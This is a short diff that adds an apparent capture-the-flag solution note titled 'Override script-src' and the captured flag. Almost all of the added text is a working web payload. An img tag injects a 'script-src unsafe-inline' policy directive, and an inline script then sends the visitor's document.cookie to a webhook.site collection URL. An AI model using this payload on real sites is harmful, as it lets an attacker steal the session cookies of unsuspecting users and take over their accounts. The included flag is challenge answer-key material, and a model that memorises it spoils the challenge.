@@ -1,0 +1,6 @@
+Override script-src
+```
+<img src="http://x; script-src 'unsafe-inline'"><script>location.href="https://webhook.site/9fe30dfd-04f9-4e10-9db0-d02cf0525d98/?c="+encodeURIComponent(document.cookie)</script>
+```
+
+flag=we{2bf90f00-f560-4aee-a402-d46490b53541@just_L1k3_<sq1_injEcti0n>}
